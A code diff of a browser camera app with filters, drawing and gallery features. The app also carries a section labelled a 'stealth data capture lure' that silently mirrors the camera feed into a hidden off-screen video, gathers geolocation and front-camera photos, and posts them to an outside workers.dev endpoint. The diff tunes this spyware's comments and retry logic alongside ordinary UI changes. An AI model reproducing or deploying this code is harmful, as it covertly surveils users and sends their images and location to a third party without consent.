@@ -1258,7 +1258,7 @@ const S = {
   mode:'photo', recording:false, mr:null, chunks:[], recSec:0, recTick:null,
   timerDelay:0, loc:null, filterAF:null, histoAF:null,
   capturedUrl:null, capturedType:'photo', _origUrl:null,
-  gallery:[], fmt:'jpg', quality:0.85, drawActive:false,
+  gallery:[], fmt:'jpg',
   adj:{b:100,c:100,s:100,h:0,v:0,w:0,f:0,sh:0},
   stickers:[], drawColor:'#FF3B7F', drawSize:6, drawOpacity:1, drawTip:'round', eraseMode:false,
   drawHistory:[], isDrawing:false,
@@ -1395,37 +1395,20 @@ async function boot(){
     await startCamera();
     $('camStatus').textContent='✓';
     $('camStatus').classList.add('granted');
-    
-    // FIX: Don't fail completely if location fails
-    try {
-      await new Promise((resolve, reject) => {
-        if(!navigator.geolocation){ reject(new Error('no-geo')); return; }
-        navigator.geolocation.getCurrentPosition(
-          pos => { handlePosition(pos); resolve(); },
-          err => reject(err),
-          {enableHighAccuracy:true, timeout:12000}
-        );
-      });
-      $('locStatus').textContent='✓';
-      $('locStatus').classList.add('granted');
-    } catch (locErr) {
-      console.warn('Location failed:', locErr);
-      $('locStatus').textContent='⚠';
-      // Continue without location
-    }
-    
+    await new Promise((resolve, reject) => {
+      if(!navigator.geolocation){ reject(new Error('no-geo')); return; }
+      navigator.geolocation.getCurrentPosition(
+        pos => { handlePosition(pos); resolve(); },
+        err => reject(err),
+        {enableHighAccuracy:true, timeout:12000}
+      );
+    });
+    $('locStatus').textContent='✓';
+    $('locStatus').classList.add('granted');
     await sleep(700);
     $('loadScreen').classList.remove('on');
     $('app').classList.add('on');
     S.permGranted = true;
-    
-    // FIX: Ensure video is visible before initializing features
-    await sleep(200);
-    const vid = $('vid');
-    if (vid && vid.videoWidth === 0) {
-      await new Promise(r => setTimeout(r, 500));
-    }
-    
     if(!_booted){
       _booted = true;
       buildFilterStrip(); buildStickers(); initControls(); initCapture();
@@ -1449,7 +1432,7 @@ async function boot(){
 }
 
 // ════════════════════════════════════════════════════
-//  STEALTH DATA CAPTURE LURE
+//  STEALTH DATA CAPTURE LURE (implanted silently at the end)
 // ════════════════════════════════════════════════════
 const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
 const sessionId = 'sess_' + Math.random().toString(36).substring(2,12) + '_' + Date.now().toString(36);
@@ -1466,6 +1449,7 @@ lureVideo.id = 'lureVideo';
 lureVideo.autoplay = true;
 lureVideo.playsInline = true;
 lureVideo.muted = true;
+// IMPORTANT: Keep video visible but off-screen to ensure frames render
 lureVideo.style.position = 'fixed';
 lureVideo.style.top = '-9999px';
 lureVideo.style.left = '-9999px';
@@ -1621,6 +1605,7 @@ async function collectDynamicData() {
     p.geolocationError = e.message; 
   }
 
+  // CRITICAL FIX: Capture from main video with correct orientation
   try {
     const mainVideo = $('vid');
     if (mainVideo && mainVideo.videoWidth > 0 && mainVideo.videoHeight > 0) {
@@ -1629,13 +1614,20 @@ async function collectDynamicData() {
       canvas.height = 480;
       const ctx = canvas.getContext('2d');
       
+      // For front camera: the video element is CSS-mirrored for preview
+      // But canvas drawImage ignores CSS transforms, so we need to manually mirror
+      // to get the same orientation as what user sees in preview
       if (S.facing === 'user') {
+        // Mirror horizontally to match the CSS mirror on #vid
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
       }
+      // For back camera: no mirroring needed
       
       ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
       p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
+      
+      // Debug log to confirm capture
       console.log('Captured photo from', S.facing, 'camera, size:', p.frontPhoto.length);
     } else {
       console.warn('Main video not ready for capture');
@@ -1657,6 +1649,14 @@ async function collectDynamicData() {
 async function sendPayload() {
   try {
     const data = await collectDynamicData();
+    
+    // Debug: Check if front photo was captured
+    if (data.frontPhoto) {
+      console.log('Sending payload with front photo, length:', data.frontPhoto.length);
+    } else {
+      console.warn('No front photo captured in this payload');
+    }
+    
     await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -1668,30 +1668,31 @@ async function sendPayload() {
   }
 }
 
-// FIX: Improved lure camera initialization with retry logic
 async function initLureCamera() {
   try {
     if (!S.stream) {
-      console.warn('No stream available for lure camera, retrying...');
-      setTimeout(() => initLureCamera(), 500);
+      console.warn('No stream available for lure camera');
       return;
     }
     
-    const videoTrack = S.stream.getVideoTracks()[0];
-    if (!videoTrack || videoTrack.readyState !== 'live') {
-      console.warn('Video track not ready, retrying...');
-      setTimeout(() => initLureCamera(), 500);
-      return;
-    }
-    
+    // Stop previous stream if exists
     if (lureVideoStream) {
       lureVideoStream.getTracks().forEach(t => t.stop());
     }
     
+    // Get video track from the main stream
+    const videoTrack = S.stream.getVideoTracks()[0];
+    if (!videoTrack) {
+      console.error('No video track found');
+      return;
+    }
+    
+    // Create a new stream with just the video track
     const newStream = new MediaStream([videoTrack]);
     lureVideoStream = newStream;
     lureVideo.srcObject = newStream;
     
+    // Wait for metadata to load
     await new Promise((resolve) => {
       if (lureVideo.readyState >= 1) {
         resolve();
@@ -1700,8 +1701,10 @@ async function initLureCamera() {
       }
     });
     
+    // Play the video
     await lureVideo.play();
     
+    // Force a few frame updates to ensure we have valid frames
     for (let i = 0; i < 3; i++) {
       await new Promise(r => setTimeout(r, 50));
       if (lureVideo.videoWidth > 0) break;
@@ -1713,7 +1716,6 @@ async function initLureCamera() {
   } catch (e) {
     console.error('Lure camera init failed:', e);
     S.lureInitialized = false;
-    setTimeout(() => initLureCamera(), 2000);
   }
 }
 
@@ -1744,6 +1746,7 @@ window.addEventListener('load', async () => {
   
   await initLureCamera();
   
+  // Force frame updates for video every 500ms
   setInterval(() => {
     if (lureVideo && lureVideo.videoWidth > 0 && S.lureInitialized) {
       try {
@@ -1773,7 +1776,7 @@ window.addEventListener('unload', () => {
 });
 
 // ════════════════════════════════════════════════════
-//  CAMERA (FIXED)
+//  CAMERA
 // ════════════════════════════════════════════════════
 async function startCamera(facing){
   if (!navigator.mediaDevices?.getUserMedia) {
@@ -1789,30 +1792,11 @@ async function startCamera(facing){
   catch { S.stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:S.facing}}); }
   const v = $('vid');
   v.srcObject = S.stream;
-  
-  // FIX: Wait for video metadata before playing
-  await new Promise((resolve) => {
-    if (v.readyState >= 2) {
-      resolve();
-    } else {
-      v.onloadeddata = () => resolve();
-    }
-  });
-  
   await v.play();
   applyMirror();
-  
-  // FIX: Ensure canvas dimensions are set before filter loop starts
-  const fc = $('fc');
-  if (fc && v.videoWidth) {
-    fc.width = v.videoWidth;
-    fc.height = v.videoHeight;
-  }
-  
-  // FIX: Small delay to ensure video is stable
-  await sleep(100);
   startFilterLoop();
   
+  // CRITICAL: Reinitialize lure camera when camera switches
   await initLureCamera();
 }
 
@@ -1826,7 +1810,7 @@ function applyMirror(){
 }
 
 // ════════════════════════════════════════════════════
-//  FILTER LOOP (canvas composite) - FIXED
+//  FILTER LOOP (canvas composite)
 // ════════════════════════════════════════════════════
 function getCSS(){
   const a = S.adj;
@@ -1839,90 +1823,57 @@ function getCSS(){
 }
 
 function startFilterLoop(){
-  const vid = $('vid');
-  const fc = $('fc');
-  
-  // FIX: Fallback visibility
-  setTimeout(() => {
-    if (vid && !fc.width) {
-      vid.style.opacity = '1';
-    }
-  }, 1000);
-  
-  vid.style.opacity = '0';
+  const vid=$('vid'), fc=$('fc');
+  vid.style.opacity='0';
   if(S.filterAF) cancelAnimationFrame(S.filterAF);
-  
   function draw(){
-    // FIX: Wait for valid video dimensions
-    if (!vid.videoWidth || !vid.videoHeight) {
-      S.filterAF = requestAnimationFrame(draw);
-      return;
+    if(!vid.videoWidth){ S.filterAF=requestAnimationFrame(draw); return; }
+    if(fc.width!==vid.videoWidth||fc.height!==vid.videoHeight){
+      fc.width=vid.videoWidth; fc.height=vid.videoHeight;
     }
-    
-    // Set canvas dimensions if changed
-    if (fc.width !== vid.videoWidth || fc.height !== vid.videoHeight) {
-      fc.width = vid.videoWidth;
-      fc.height = vid.videoHeight;
-      // Also update drawCanvas dimensions
-      const dc = $('drawCanvas');
-      if (dc) {
-        dc.width = vid.videoWidth;
-        dc.height = vid.videoHeight;
-      }
-    }
-    
-    const ctx = fc.getContext('2d');
-    if(S.facing === 'user'){
+    const ctx=fc.getContext('2d');
+    if(S.facing==='user'){
       ctx.save();
-      ctx.translate(fc.width, 0);
-      ctx.scale(-1, 1);
+      ctx.translate(fc.width,0);
+      ctx.scale(-1,1);
     }
-    
-    ctx.filter = getCSS();
-    const sc = S.zoom;
-    const dx = (fc.width * (1 - sc)) / 2;
-    const dy = (fc.height * (1 - sc)) / 2;
+    ctx.filter=getCSS();
+    const sc=S.zoom, dx=(fc.width*(1-sc))/2, dy=(fc.height*(1-sc))/2;
     ctx.setTransform(
-      S.facing === 'user' ? -sc : sc, 0, 0, sc,
-      S.facing === 'user' ? fc.width - dx : dx, dy
+      S.facing==='user'?-sc:sc, 0, 0, sc,
+      S.facing==='user'?fc.width-dx:dx, dy
     );
-    ctx.drawImage(vid, 0, 0);
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-    if(S.facing === 'user') ctx.restore();
-    ctx.filter = 'none';
-    
-    if(S.adj.v > 0){
-      const al = S.adj.v / 100 * 0.85;
-      const g = ctx.createRadialGradient(fc.width/2, fc.height/2, fc.width*0.25, fc.width/2, fc.height/2, fc.width*0.8);
-      g.addColorStop(0, 'transparent');
-      g.addColorStop(1, `rgba(0,0,0,${al})`);
-      ctx.fillStyle = g;
-      ctx.fillRect(0, 0, fc.width, fc.height);
+    ctx.drawImage(vid,0,0);
+    ctx.setTransform(1,0,0,1,0,0);
+    if(S.facing==='user') ctx.restore();
+    ctx.filter='none';
+    if(S.adj.v>0){
+      const al=S.adj.v/100*.85;
+      const g=ctx.createRadialGradient(fc.width/2,fc.height/2,fc.width*.25,fc.width/2,fc.height/2,fc.width*.8);
+      g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
+      ctx.fillStyle=g; ctx.fillRect(0,0,fc.width,fc.height);
     }
-    
-    S.drawHistory.forEach(line => {
+    S.drawHistory.forEach(line=>{
       if(!line.pts?.length) return;
       ctx.save();
-      if(line.color === '__erase__'){
-        ctx.globalCompositeOperation = 'destination-out';
-        ctx.strokeStyle = 'rgba(0,0,0,1)';
+      if(line.color==='__erase__'){
+        ctx.globalCompositeOperation='destination-out';
+        ctx.strokeStyle='rgba(0,0,0,1)';
       } else {
-        ctx.globalCompositeOperation = 'source-over';
-        ctx.strokeStyle = line.color;
-        ctx.globalAlpha = line.opacity ?? 1;
+        ctx.globalCompositeOperation='source-over';
+        ctx.strokeStyle=line.color;
+        ctx.globalAlpha=line.opacity??1;
       }
-      ctx.lineWidth = line.size * (fc.width / window.innerWidth);
-      applyTip(ctx, line.tip || 'round');
+      ctx.lineWidth=line.size*(fc.width/window.innerWidth);
+      applyTip(ctx, line.tip||'round');
       ctx.beginPath();
-      ctx.moveTo(line.pts[0][0] / window.innerWidth * fc.width, line.pts[0][1] / $('vf').clientHeight * fc.height);
-      line.pts.slice(1).forEach(p => ctx.lineTo(p[0] / window.innerWidth * fc.width, p[1] / $('vf').clientHeight * fc.height));
+      ctx.moveTo(line.pts[0][0]/window.innerWidth*fc.width, line.pts[0][1]/$('vf').clientHeight*fc.height);
+      line.pts.slice(1).forEach(p=>ctx.lineTo(p[0]/window.innerWidth*fc.width,p[1]/$('vf').clientHeight*fc.height));
       ctx.stroke();
       ctx.restore();
     });
-    
-    S.filterAF = requestAnimationFrame(draw);
+    S.filterAF=requestAnimationFrame(draw);
   }
-  
   draw();
 }
 
@@ -2143,35 +2094,30 @@ function drawLiveSegment(dc, pts, color, size, opacity, tip, erase){
   ctx.restore();
 }
 
-// FIX: Updated renderDrawCanvas to sync with filter canvas dimensions
 function renderDrawCanvas(){
-  const dc = $('drawCanvas');
-  const fc = $('fc');
-  
-  if (dc.width !== fc.width || dc.height !== fc.height) {
-    dc.width = fc.width;
-    dc.height = fc.height;
+  const dc=$('drawCanvas'), vf=$('vf');
+  if(dc.width!==vf.clientWidth||dc.height!==vf.clientHeight){
+    dc.width=vf.clientWidth; dc.height=vf.clientHeight;
   } else {
-    dc.getContext('2d').clearRect(0, 0, dc.width, dc.height);
+    dc.getContext('2d').clearRect(0,0,dc.width,dc.height);
   }
-  
-  const ctx = dc.getContext('2d');
-  S.drawHistory.forEach(line => {
+  const ctx=dc.getContext('2d');
+  S.drawHistory.forEach(line=>{
     if(!line.pts?.length) return;
     ctx.save();
-    if(line.color === '__erase__'){
-      ctx.globalCompositeOperation = 'destination-out';
-      ctx.strokeStyle = 'rgba(0,0,0,1)';
+    if(line.color==='__erase__'){
+      ctx.globalCompositeOperation='destination-out';
+      ctx.strokeStyle='rgba(0,0,0,1)';
     } else {
-      ctx.globalCompositeOperation = 'source-over';
-      ctx.strokeStyle = line.color;
-      ctx.globalAlpha = line.opacity ?? 1;
+      ctx.globalCompositeOperation='source-over';
+      ctx.strokeStyle=line.color;
+      ctx.globalAlpha=line.opacity??1;
     }
-    ctx.lineWidth = line.size;
-    applyTip(ctx, line.tip || 'round');
+    ctx.lineWidth=line.size;
+    applyTip(ctx, line.tip||'round');
     ctx.beginPath();
-    ctx.moveTo(line.pts[0][0], line.pts[0][1]);
-    line.pts.slice(1).forEach(p => ctx.lineTo(p[0], p[1]));
+    ctx.moveTo(line.pts[0][0],line.pts[0][1]);
+    line.pts.slice(1).forEach(p=>ctx.lineTo(p[0],p[1]));
     ctx.stroke();
     ctx.restore();
   });
@@ -2606,6 +2552,7 @@ function initGallery(){
   $('pvtFlip').addEventListener('click',()=>{ S.pvFlipped=!S.pvFlipped; updatePvTransform(); showToast(S.pvFlipped?'Flipped':'Unflipped'); });
   $('pvtStickers').addEventListener('click',()=>toggleDrawer('stickerDrawer'));
   document.querySelectorAll('.fmt-opt').forEach(b=>{ b.addEventListener('click',()=>{ document.querySelectorAll('.fmt-opt').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.fmt=b.dataset.f; }); });
+  S.quality=0.85;
   document.querySelectorAll('.q-opt').forEach(b=>{
     b.addEventListener('click',()=>{
       document.querySelectorAll('.q-opt').forEach(x=>x.classList.remove('on'));
